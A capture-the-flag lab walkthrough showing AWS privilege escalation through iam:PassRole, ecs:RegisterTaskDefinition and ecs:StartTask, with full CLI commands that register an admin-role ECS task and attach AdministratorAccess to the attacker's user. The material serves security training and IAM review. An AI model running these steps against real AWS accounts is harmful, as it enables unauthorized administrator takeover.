# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:RegisterTaskDefinition + ecs:StartTask

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass IAM roles to ECS tasks (`iam:PassRole`), register ECS task definitions (`ecs:RegisterTaskDefinition`), and start ECS tasks (`ecs:StartTask`). The attacker can create a malicious ECS task definition that uses an administrative execution role, then launch it on EC2 container instances to modify IAM permissions and grant themselves administrator access.

The key difference between `ecs:StartTask` and the more common `ecs:RunTask` is their intended use case. While `ecs:RunTask` is the standard way to launch tasks and automatically places them within the cluster, `ecs:StartTask` is designed for tasks managed by external schedulers or custom task placement logic. However, both permissions provide the same capability: executing containers with potentially elevated privileges. In practice, `ecs:StartTask` may be overlooked during security reviews because it's less commonly used than `ecs:RunTask`, making it a subtle but effective privilege escalation vector.

ECS tasks running on EC2 container instances receive temporary credentials based on their task execution role. By combining `iam:PassRole` with ECS task definition registration and task start permissions, an attacker can leverage the container platform to run arbitrary code with elevated privileges. ECS tasks are ephemeral, execute quickly, and leave minimal forensic evidence beyond CloudTrail logs.

The attack works by registering a task definition that specifies an admin role and contains a containerized AWS CLI command to attach the AdministratorAccess policy to the starting user. When the task starts on an EC2 container instance, it executes with the admin role's credentials and persistently elevates the attacker's privileges. This technique is particularly stealthy because ECS tasks can complete in seconds and automatically clean up their infrastructure.

## The Challenge

You are operating as `pl-prod-ecs-005-to-admin-starting-user`, an IAM user whose credentials you have obtained. You have three key permissions: `iam:PassRole` on the target admin role, `ecs:RegisterTaskDefinition`, and `ecs:StartTask`. Your goal is to obtain effective administrator access.

The target role is `pl-prod-ecs-005-to-admin-target-role`, which holds `AdministratorAccess` and trusts `ecs-tasks.amazonaws.com`. There is also a running ECS cluster (`pl-prod-ecs-005-cluster`) with an EC2 container instance already registered and ready to accept tasks.

## Reconnaissance

First, confirm your identity and verify you lack admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-ecs-005-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- confirmed, no admin access yet
```

Next, find the container instance ARN you'll need for `ecs:StartTask`. Unlike `ecs:RunTask`, `StartTask` requires you to explicitly target a specific container instance:

```bash
aws ecs list-container-instances --cluster pl-prod-ecs-005-cluster
# Returns: containerInstanceArns: ["arn:aws:ecs:<region>:<account_id>:container-instance/pl-prod-ecs-005-cluster/<id>"]
```

Grab that ARN -- you'll need it in the exploitation step.

You can also check what policies are currently attached to your user to confirm the baseline state:

```bash
aws iam list-attached-user-policies --user-name pl-prod-ecs-005-to-admin-starting-user
# AttachedPolicies: [] -- no managed policies attached yet
```

## Exploitation

### Step 1: Register a malicious ECS task definition

You'll register a task definition that specifies the admin role as both the task role and the execution role. The container command is a single `aws iam attach-user-policy` call that grants `AdministratorAccess` to your starting user:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ecs-005-to-admin-target-role"

aws ecs register-task-definition \
  --family pl-ecs-005-admin-escalation \
  --network-mode bridge \
  --requires-compatibilities EC2 \
  --task-role-arn "$ADMIN_ROLE_ARN" \
  --execution-role-arn "$ADMIN_ROLE_ARN" \
  --container-definitions '[{
    "name": "escalation-container",
    "image": "amazon/aws-cli:latest",
    "essential": true,
    "memory": 512,
    "cpu": 256,
    "command": [
      "iam", "attach-user-policy",
      "--user-name", "pl-prod-ecs-005-to-admin-starting-user",
      "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
    ]
  }]'
```

This call succeeds because you have `iam:PassRole` on the target role and `ecs:RegisterTaskDefinition` on `*`. Note the revision number returned -- you'll use it next.

### Step 2: Start the task on the EC2 container instance

With the task definition registered, use `ecs:StartTask` to launch it on the container instance you found during recon:

```bash
CONTAINER_INSTANCE_ARN="arn:aws:ecs:<region>:<account_id>:container-instance/pl-prod-ecs-005-cluster/<id>"

aws ecs start-task \
  --cluster pl-prod-ecs-005-cluster \
  --task-definition pl-ecs-005-admin-escalation:1 \
  --container-instances "$CONTAINER_INSTANCE_ARN"
```

The task launches and the ECS agent on the EC2 instance pulls the `amazon/aws-cli` image and executes the command. The container runs with temporary credentials vended by the EC2 instance's IMDS on behalf of the task role -- in this case `pl-prod-ecs-005-to-admin-target-role`, which has `AdministratorAccess`.

### Step 3: Wait for the task to complete

The task is ephemeral and typically finishes in 30--60 seconds. You can poll its status:

```bash
TASK_ARN="<task_arn_from_start-task_output>"

aws ecs describe-tasks \
  --cluster pl-prod-ecs-005-cluster \
  --tasks "$TASK_ARN" \
  --query 'tasks[0].{status:lastStatus,exitCode:containers[0].exitCode}'
```

When `lastStatus` is `STOPPED` and `exitCode` is `0`, the policy attachment succeeded.

## Verification

After waiting ~15 seconds for IAM policy propagation, verify that `AdministratorAccess` was attached:

```bash
aws iam list-attached-user-policies --user-name pl-prod-ecs-005-to-admin-starting-user
# AttachedPolicies:
#   - PolicyName: AdministratorAccess
#     PolicyArn: arn:aws:iam::aws:policy/AdministratorAccess
```

And confirm you now have admin access:

```bash
aws iam list-users --max-items 3 --output table
# Successfully lists IAM users -- admin access confirmed
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ecs-005-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited three permissions in combination: `iam:PassRole` let you attach an admin role to a task definition, `ecs:RegisterTaskDefinition` let you create a task definition with a container command of your choosing, and `ecs:StartTask` let you execute that task on a real EC2 container instance in the cluster.

The ECS task ran as `pl-prod-ecs-005-to-admin-target-role` and issued a single `iam:AttachUserPolicy` call that permanently elevated your starting user to `AdministratorAccess`. The task was ephemeral -- it ran, exited with code 0, and is gone -- but the IAM policy attachment persists until explicitly revoked.

In real environments, `ecs:StartTask` is often granted to custom schedulers and orchestration pipelines without realizing that, combined with `iam:PassRole` and `ecs:RegisterTaskDefinition`, it creates a full privilege escalation path. The less common nature of `ecs:StartTask` vs `ecs:RunTask` makes it easy to overlook during IAM access reviews.
